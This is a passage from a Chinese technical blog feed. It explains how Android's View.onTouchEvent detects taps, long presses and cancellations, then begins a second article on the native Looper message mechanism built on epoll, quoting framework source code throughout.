利用消息队列来延迟发送检测单击事件的方法，延迟时间为getTapTimeout设置的超时（下文讲）</span></span><br><span class="line">    postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// 没有在滚动容器中，马上显示触摸反馈，并且开始检查长按事件（下文讲）</span></span><br><span class="line">    setPressed(<span class="keyword">true</span>, x, y);</span><br><span class="line">    checkForLongClick(<span class="number">0</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<h5 id="performButtonActionOnTouchDown"><a href="#performButtonActionOnTouchDown" class="headerlink" title="performButtonActionOnTouchDown()"></a>performButtonActionOnTouchDown()</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">performButtonActionOnTouchDown</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp;</span><br><span class="line">        (event.getButtonState() &amp; MotionEvent.BUTTON_SECONDARY) != <span class="number">0</span>) &#123;</span><br><span class="line">        showContextMenu(event.getX(), event.getY());</span><br><span class="line">        mPrivateFlags |= PFLAG_CANCEL_NEXT_UP_EVENT;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只是处理了事件来源是鼠标的特殊情况。</p>
<h5 id="CheckForTap"><a href="#CheckForTap" class="headerlink" title="CheckForTap()"></a>CheckForTap()</h5><p>它是一个<code>Runnable</code>，用于延迟执行单击检测的任务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckForTap</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">float</span> x;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">float</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mPrivateFlags &amp;= ~PFLAG_PREPRESSED;</span><br><span class="line">        setPressed(<span class="keyword">true</span>, x, y);</span><br><span class="line">        checkForLongClick(ViewConfiguration.getTapTimeout(), x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它被放到消息队列，在设置的超时之后被执行，如果这段时间它没有被移出队列，那么说明这就是一个单击事件，那么就显示触摸反馈并开始长按检测。</p>
<h5 id="postDelayed"><a href="#postDelayed" class="headerlink" title="postDelayed()"></a>postDelayed()</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">postDelayed</span><span class="params">(Runnable action, <span class="keyword">long</span> delayMillis)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> AttachInfo attachInfo = mAttachInfo;</span><br><span class="line">    <span class="keyword">if</span> (attachInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> attachInfo.mHandler.postDelayed(action, delayMillis);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getRunQueue().postDelayed(action, delayMillis);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>往注册的<code>Handler</code>的消息队列或者他自己实现的一个消息队列中发送需要被延时执行的消息，这块就不深入探究了，消息机制分析的文章已经讲得很清楚了。</p>
<h5 id="checkForLongClick"><a href="#checkForLongClick" class="headerlink" title="checkForLongClick()"></a>checkForLongClick()</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((mViewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) &#123;</span><br><span class="line">    mHasPerformedLongPress = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mPendingCheckForLongPress == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mPendingCheckForLongPress = <span class="keyword">new</span> CheckForLongPress();</span><br><span class="line">    &#125;</span><br><span class="line">    mPendingCheckForLongPress.setAnchor(x, y);</span><br><span class="line">    mPendingCheckForLongPress.rememberWindowAttachCount();</span><br><span class="line">    postDelayed(mPendingCheckForLongPress,</span><br><span class="line">            ViewConfiguration.getLongPressTimeout() - delayOffset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样是利用<code>postDelayed()</code>方法来检测是否到达了检测时间，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckForLongPress</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> mOriginalWindowAttachCount;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> mX;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> mY;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isPressed() &amp;&amp; (mParent != <span class="keyword">null</span>)</span><br><span class="line">                &amp;&amp; mOriginalWindowAttachCount == mWindowAttachCount) &#123;</span><br><span class="line">            <span class="keyword">if</span> (performLongClick(mX, mY)) &#123;</span><br><span class="line">                mHasPerformedLongPress = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAnchor</span><span class="params">(<span class="keyword">float</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">        mX = x;</span><br><span class="line">        mY = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rememberWindowAttachCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mOriginalWindowAttachCount = mWindowAttachCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>run()</code>方法被执行，说明到达了设定的时间并且没有因为触摸点移动或者抬起而移除该<code>Runnable</code>信息，为一个长按动作，执行<code>performLongClick()</code>方法来触发长按回调：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">performLongClick</span><span class="params">(<span class="keyword">float</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">    mLongClickX = x;</span><br><span class="line">    mLongClickY = y;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> handled = performLongClick();</span><br><span class="line">    mLongClickX = Float.NaN;</span><br><span class="line">    mLongClickY = Float.NaN;</span><br><span class="line">    <span class="keyword">return</span> handled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">performLongClick</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> performLongClickInternal(mLongClickX, mLongClickY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">performLongClickInternal</span><span class="params">(<span class="keyword">float</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">    sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_LONG_CLICKED);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> handled = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">final</span> ListenerInfo li = mListenerInfo;</span><br><span class="line">    <span class="keyword">if</span> (li != <span class="keyword">null</span> &amp;&amp; li.mOnLongClickListener != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handled = li.mOnLongClickListener.onLongClick(View.<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!handled) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">boolean</span> isAnchored = !Float.isNaN(x) &amp;&amp; !Float.isNaN(y);</span><br><span class="line">        handled = isAnchored ? showContextMenu(x, y) : showContextMenu();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handled) &#123;</span><br><span class="line">        performHapticFeedback(HapticFeedbackConstants.LONG_PRESS);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> handled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第5-8行是与之前<code>onTouchEvent()</code>方法中类似的关于是否注册了监听器的判断，如果注册了监听器，那么优先使用监听器的<code>onLongClick()</code>方法来处理长近事件，如果没有监听器成功处理事件，那么会先判断长按是否有锚点，再根据锚点的存在性调用<code>showContextMenu()</code>显示可能存在的上下文菜单。</p>
<p>13行判断如果当前方法成功消耗了长按事件，调用<code>performHapticFeedback()</code>方法显示一个触觉的反馈。</p>
<h4 id="case-MotionEvent-ACTION-MOVE"><a href="#case-MotionEvent-ACTION-MOVE" class="headerlink" title="case MotionEvent.ACTION_MOVE:"></a>case MotionEvent.ACTION_MOVE:</h4><p>触摸点发生了移动</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">drawableHotspotChanged(x, y);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pointInView(x, y, mTouchSlop)) &#123;</span><br><span class="line">    removeTapCallback();</span><br><span class="line">    <span class="keyword">if</span> ((mPrivateFlags &amp; PFLAG_PRESSED) != <span class="number">0</span>) &#123;</span><br><span class="line">        removeLongPressCallback();</span><br><span class="line"></span><br><span class="line">        setPressed(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>第1行调用了<code>drawableHotspotChanged()</code>通知可能存在的子<code>View</code>或<code>drawable</code>触摸点发生了移动。</p>
<p>第3行检测由于移动，触摸点是否移出了<code>view</code>+<code>slop</code>扩展出的范围，<code>slop</code>的存在是为了保证在按下后轻微移出点击区域的情况下能正常判断点击：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">pointInView</span><span class="params">(<span class="keyword">float</span> localX, <span class="keyword">float</span> localY, <span class="keyword">float</span> slop)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> localX &gt;= -slop &amp;&amp; localY &gt;= -slop &amp;&amp; localX &lt; ((mRight - mLeft) + slop) &amp;&amp;</span><br><span class="line">            localY &lt; ((mBottom - mTop) + slop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果移出了这个范围，首先第4行调用<code>removeTapCall()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeTapCallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mPendingCheckForTap != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mPrivateFlags &amp;= ~PFLAG_PREPRESSED;</span><br><span class="line">        removeCallbacks(mPendingCheckForTap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先取消了预按下状态的<code>flag</code>，再调用<code>removeCallbacks</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">removeCallbacks</span><span class="params">(Runnable action)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (action != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> AttachInfo attachInfo = mAttachInfo;</span><br><span class="line">        <span class="keyword">if</span> (attachInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">            attachInfo.mHandler.removeCallbacks(action);</span><br><span class="line">            attachInfo.mViewRootImpl.mChoreographer.removeCallbacks(</span><br><span class="line">                    Choreographer.CALLBACK_ANIMATION, action, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        getRunQueue().removeCallbacks(action);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从消息队列中移出我们检测单击事件的消息，这样，由于触摸点移动出了当前<code>view</code>，如果在滚动容器中的情况下，长按的检测就不会进行（因<code>mPendingCheckForTap</code>消息被移出消息队列）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((mPrivateFlags &amp; PFLAG_PRESSED) != <span class="number">0</span>) &#123;</span><br><span class="line">    removeLongPressCallback();</span><br><span class="line"></span><br><span class="line">    setPressed(<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>pressed</code>标志位为1，那么就取消消息队列中长按触发消息，同时去除<code>pressed</code>标志位。</p>
<p>总结一下，只要触摸点移动出了当前<code>view</code>，那么所有的点击、长按事件都不会触发，但是只要移动还在<code>view</code>+<code>slot</code>范围内，那么点击长按事件还是会被触发的。</p>
<h4 id="case-MotionEvent-ACTION-UP"><a href="#case-MotionEvent-ACTION-UP" class="headerlink" title="case MotionEvent.ACTION_UP:"></a>case MotionEvent.ACTION_UP:</h4><p>抬起手指</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> prepressed = (mPrivateFlags &amp; PFLAG_PREPRESSED) != <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ((mPrivateFlags &amp; PFLAG_PRESSED) != <span class="number">0</span> || prepressed) &#123;</span><br><span class="line">    <span class="comment">// 如果有prepressed或pressed标志</span></span><br><span class="line">    <span class="keyword">boolean</span> focusTaken = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) &#123;</span><br><span class="line">        <span class="comment">// 可以获得焦点但没有获得</span></span><br><span class="line">        <span class="comment">// 请求获取焦点</span></span><br><span class="line">        focusTaken = requestFocus();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prepressed) &#123;</span><br><span class="line">        <span class="comment">// prepressed状态表示滚动容器中的点击检测还没有被消息队列执行，这个时候如果抬起手指说明是一个点击事件，调用setPressed显示反馈</span></span><br><span class="line">        setPressed(<span class="keyword">true</span>, x, y);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) &#123;</span><br><span class="line">        <span class="comment">// 没有到达执行长按触发消息的时间就抬起了手指，说明这是一个单击事件，移除长按触发消息</span></span><br><span class="line">        removeLongPressCallback();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!focusTaken) &#123;</span><br><span class="line">            <span class="comment">// 当当前view没有获取焦点时才能触发点击事件，说明一个可以获取焦点的view是无法触发点击事件的</span></span><br><span class="line">            <span class="keyword">if</span> (mPerformClick == <span class="keyword">null</span>) &#123;</span><br><span class="line">                mPerformClick = <span class="keyword">new</span> PerformClick();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使用post来将performClick动作放入队列中执行来保证其他view视觉上的变化可以在点击事件被触发之前被看到</span></span><br><span class="line">            <span class="keyword">if</span> (!post(mPerformClick)) &#123;</span><br><span class="line">                <span class="comment">// 如果post没有成功，则直接执行</span></span><br><span class="line">                performClick();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// UnsetPressedState为Runnable消息，用于取消view的prepressed或pressed状态</span></span><br><span class="line">    <span class="keyword">if</span> (mUnsetPressedState == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mUnsetPressedState = <span class="keyword">new</span> UnsetPressedState();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prepressed) &#123;</span><br><span class="line">        <span class="comment">// 取消prepressed状态</span></span><br><span class="line">        postDelayed(mUnsetPressedState,</span><br><span class="line">                ViewConfiguration.getPressedStateDuration());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!post(mUnsetPressedState)) &#123;</span><br><span class="line">        <span class="comment">// 取消pressed状态</span></span><br><span class="line">        mUnsetPressedState.run();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 清除单击检测消息</span></span><br><span class="line">    removeTapCallback();</span><br><span class="line">&#125;</span><br><span class="line">mIgnoreNextUpEvent = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>up</code>时，才是单击事件真正触发的地方，如果这个<code>view</code>可以获得焦点，那么会优先处理焦点获取，而不会触发点击事件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">performClick</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> result;</span><br><span class="line">    <span class="keyword">final</span> ListenerInfo li = mListenerInfo;</span><br><span class="line">    <span class="keyword">if</span> (li != <span class="keyword">null</span> &amp;&amp; li.mOnClickListener != <span class="keyword">null</span>) &#123;</span><br><span class="line">        playSoundEffect(SoundEffectConstants.CLICK);</span><br><span class="line">        li.mOnClickListener.onClick(<span class="keyword">this</span>);</span><br><span class="line">        result = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相似的方法，检测了是否有监听的存在并执行，最后给辅助功能选项发送一条消息。</p>
<h4 id="case-MotionEvent-ACTION-CANCEL"><a href="#case-MotionEvent-ACTION-CANCEL" class="headerlink" title="case MotionEvent.ACTION_CANCEL:"></a>case MotionEvent.ACTION_CANCEL:</h4><p>取消这一系列触摸动作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> MotionEvent.ACTION_CANCEL:</span><br><span class="line">setPressed(<span class="keyword">false</span>);</span><br><span class="line">removeTapCallback();</span><br><span class="line">removeLongPressCallback();</span><br><span class="line">mInContextButtonPress = <span class="keyword">false</span>;</span><br><span class="line">mHasPerformedLongPress = <span class="keyword">false</span>;</span><br><span class="line">mIgnoreNextUpEvent = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>清除所有的状态。</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p><code>View</code>默认的<code>onTouchEvent()</code>方法处理了一系列的触摸事件， 判断是否触发单击、长按等，并且提供了默认的按下、点击、长按的视觉反馈。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 消息机制（三）Native层消息机制</title>
    <url>/2017/11/02/android_event_3/</url>
    <content><![CDATA[<p>之前的两篇文章讲解了<code>java</code>层消息机制的过程以及使用，中间省略了比较多的代码就是在<code>native</code>层实现的消息机制中使用的。这篇文章就对这一部分进行讲解。</p>
<h2 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h2><p>我们从第一篇文章知道，<code>Looper.loop()</code>方法被调用后，会启动一个无限循环，而在这个循环中，调用了<code>MessageQueue</code>的<code>next()</code>方法以获取下一条消息，而<code>next()</code>方法中会首先调用<code>nativePollOnce()</code>方法，这个方法的作用在之前说过是阻塞，达到超时时间或有新的消息到达时得到<code>eventFd</code>的通知再唤醒消息队列，其实这个方法也是<code>native</code>消息处理的开始。</p>
<a id="more"></a>
<h2 id="进入Native层"><a href="#进入Native层" class="headerlink" title="进入Native层"></a>进入Native层</h2><h3 id="android-os-MessageQueue-nativePollOnce"><a href="#android-os-MessageQueue-nativePollOnce" class="headerlink" title="android_os_MessageQueue_nativePollOnce()"></a>android_os_MessageQueue_nativePollOnce()</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_MessageQueue_nativePollOnce</span><span class="params">(JNIEnv* env, jobject obj,</span></span></span><br><span class="line"><span class="function"><span class="params">        jlong ptr, jint timeoutMillis)</span> </span>&#123;</span><br><span class="line">    NativeMessageQueue* nativeMessageQueue = <span class="keyword">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class="line">    nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NativeMessageQueue::pollOnce</span><span class="params">(JNIEnv* env, jobject pollObj, <span class="keyword">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class="line">    mPollEnv = env;</span><br><span class="line">    mPollObj = pollObj;</span><br><span class="line">    mLooper-&gt;pollOnce(timeoutMillis);</span><br><span class="line">    mPollObj = <span class="literal">NULL</span>;</span><br><span class="line">    mPollEnv = <span class="literal">NULL</span>;</span><br><span class="line">  	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>Native Looper</code>的<code>pollOnce()</code>方法：</p>
<h3 id="pollOnce"><a href="#pollOnce" class="headerlink" title="pollOnce()"></a>pollOnce()</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">pollOnce</span><span class="params">(<span class="keyword">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> pollOnce(timeoutMillis, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::pollOnce</span><span class="params">(<span class="keyword">int</span> timeoutMillis, <span class="keyword">int</span>* outFd, <span class="keyword">int</span>* outEvents, <span class="keyword">void</span>** outData)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">while</span> (mResponseIndex &lt; mResponses.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">const</span> Response&amp; response = mResponses.itemAt(mResponseIndex++);</span><br><span class="line">            <span class="keyword">int</span> ident = response.request.ident;</span><br><span class="line">            <span class="keyword">if</span> (ident &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> fd = response.request.fd;</span><br><span class="line">                <span class="keyword">int</span> events = response.events;</span><br><span class="line">                <span class="keyword">void</span>* data = response.request.data;</span><br><span class="line">              </span><br><span class="line">                <span class="keyword">if</span> (outFd != <span class="literal">NULL</span>) *outFd = fd;</span><br><span class="line">                <span class="keyword">if</span> (outEvents != <span class="literal">NULL</span>) *outEvents = events;</span><br><span class="line">                <span class="keyword">if</span> (outData != <span class="literal">NULL</span>) *outData = data;</span><br><span class="line">                <span class="keyword">return</span> ident;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (outFd != <span class="literal">NULL</span>) *outFd = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (outEvents != <span class="literal">NULL</span>) *outEvents = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (outData != <span class="literal">NULL</span>) *outData = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = pollInner(timeoutMillis);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们之前直接跳过了26行之前的内容，现在我们还是不能理解这一段的意义，从程序上看，我们从<code>mResponse</code>容器中取出了一个<code>response</code>并把他的内容放入了传入的地址参数中返回。首先，这个调用中没有传入地址参数，其次，这个<code>mResponse</code>数组是什么呢？</p>
<p>我们继续先往下看，下面的<code>pollInner()</code>方法比较长也是<code>native</code>消息机制的核心，我们拆成几个部分看。</p>
<h2 id="pollInner"><a href="#pollInner" class="headerlink" title="pollInner()"></a>pollInner()</h2><h3 id="Request-与-Response"><a href="#Request-与-Response" class="headerlink" title="Request 与 Response"></a>Request 与 Response</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">int</span> result = POLL_WAKE;</span><br><span class="line">   mResponses.<span class="built_in">clear</span>();</span><br><span class="line">   mResponseIndex = <span class="number">0</span>;</span><br><span class="line">   mPolling = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">eventItems</span>[<span class="title">EPOLL_MAX_EVENTS</span>];</span></span><br><span class="line">   <span class="keyword">int</span> eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis);</span><br><span class="line">   mPolling = <span class="literal">false</span>;</span><br><span class="line">   mLock.lock();</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; eventCount; i++) &#123;</span><br><span class="line">       <span class="keyword">int</span> fd = eventItems[i].data.fd;</span><br><span class="line">       <span class="keyword">uint32_t</span> epollEvents = eventItems[i].events;</span><br><span class="line">       <span class="keyword">if</span> (fd == mWakeEventFd) &#123;</span><br><span class="line">           <span class="keyword">if</span> (epollEvents &amp; EPOLLIN) &#123;</span><br><span class="line">               awoken();</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               ALOGW(<span class="string">"Ignoring unexpected epoll events 0x%x on wake event fd."</span>, epollEvents);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">ssize_t</span> requestIndex = mRequests.indexOfKey(fd);</span><br><span class="line">           <span class="keyword">if</span> (requestIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">int</span> events = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">if</span> (epollEvents &amp; EPOLLIN) events |= EVENT_INPUT;</span><br><span class="line">               <span class="keyword">if</span> (epollEvents &amp; EPOLLOUT) events |= EVENT_OUTPUT;</span><br><span class="line">               <span class="keyword">if</span> (epollEvents &amp; EPOLLERR) events |= EVENT_ERROR;</span><br><span class="line">               <span class="keyword">if</span> (epollEvents &amp; EPOLLHUP) events |= EVENT_HANGUP;</span><br><span class="line">               pushResponse(events, mRequests.valueAt(requestIndex));</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               ALOGW(<span class="string">"Ignoring unexpected epoll events 0x%x on fd %d that is "</span></span><br><span class="line">                       <span class="string">"no longer registered."</span>, epollEvents, fd);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>当第7行系统调用<code>epoll_wait()</code>返回时，说明因注册的<code>fd</code>有消息或达到超时，在第11行就对收到的唤醒<code>events</code>进行遍历，首先判断有消息的<code>fd</code>是不是用于唤醒的<code>mWakeEventFd</code>，如果不是的话，说明是系统调用<code>addFd()</code>方法设置的自定义<code>fd</code>（后面会讲）。那么我们需要对这个事件作出响应。</p>
<p>第21到28行就对这个<code>event</code>做处理，首先，我们以这个<code>fd</code>为<code>key</code>从<code>mRequests</code>中找到他的索引，这个<code>mRequests</code>是我们在<code>addFd()</code>方法一并注册的以<code>fd</code>为<code>key</code>，<code>Request</code>为<code>value</code>的映射表。找到<code>request</code>之后，28行调用<code>pushResponse()</code>方法去建立<code>response</code>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Looper::pushResponse</span><span class="params">(<span class="keyword">int</span> events, <span class="keyword">const</span> Request&amp; request)</span> </span>&#123;</span><br><span class="line">    Response response;</span><br><span class="line">    response.events = events;</span><br><span class="line">    response.request = request;</span><br><span class="line">    mResponses.push(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在我们要处理的任务已经被封装成了一个<code>Response</code>对象，等待被处理，那么真正的处理在哪里呢？</p>
